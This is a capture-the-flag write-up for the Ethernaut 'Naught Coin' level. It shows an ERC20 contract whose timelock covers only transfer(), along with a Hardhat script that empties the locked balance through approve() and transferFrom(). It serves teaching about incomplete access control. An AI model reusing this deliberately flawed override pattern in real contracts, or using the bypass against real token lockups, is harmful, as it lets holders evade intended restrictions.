---
title: "Ethernaut #15 Naught Coin"
tags: [ethernaut]
style: border
color: primary
description: Ethernaut Naught Coin challenge writeup
---

## Naught Coin

### Challenge

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

Things that might help

* The [ERC20](https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts) Spec
* The [OpenZeppelin](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) codebase


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
}
```

### Background

This challenge is very simple if one knows/learns the `erc20` interface. If we look closely there is more than one ways `erc20` tokens can be transfered.

`approve(address spender, uint256 amount)` and `function transferFrom(address from, address to, uint256 amount)` are functions that allow someone to spend tokens without being the owner. Those functions are useful when interacting with some middleman/broker contract. For example a user might want to buy an NFT from a marketplace. The user can allow the marketplace contract to spend funds by calling the `approve` function with the address of the marketplace and the amount the marketplace can spend. Then, when the swap is to happen, the marketplace can `transferFrom` the original address to some address up to the amount that was approved.

### Attack

The contract here only timelocks the `transfer` function, not the `transferFrom` and `approve` functions. This will allow the owner of the tokens to `approve` some address (even its self) to spend the tokens, and then use `transferFrom` to send them to another account.

* use the `approve` function to allow some address (even self) to spend the full amount of tokens
* use the `transferFrom` function to send the funds to some other account


#### nauthg-coin-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    naughtCoinAddress = "0xC316BA23E78dB02313f32C386C3773960d76C9dA";
    contract = await ethers.getContractAt("NaughtCoin", naughtCoinAddress);

    const accounts = await hre.ethers.getSigners();
    account = accounts[0];

    console.log("Level address: " + contract.address)

    // get current balance
    balance = await contract.balanceOf(account.address)
    console.log("Current Balance: " + balance)

    // approve self to spend funds
    tx = await contract.connect(account).approve(account.address, balance)
    receipt = await tx.wait()

    // spend funds using transferFrom
    tx = await contract.connect(account).transferFrom(account.address, accounts[1].address, balance)
    receipt = await tx.wait()

    // get new balance
    console.log("New Balance: " + await contract.balanceOf(account.address))
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/naught-coin-solve.js --network rinkeby
Level address  : 0xC316BA23E78dB02313f32C386C3773960d76C9dA
Current Balance: 1000000000000000000000000
New Balance    : 0
```

### Success Message

When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that `transfer` is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.
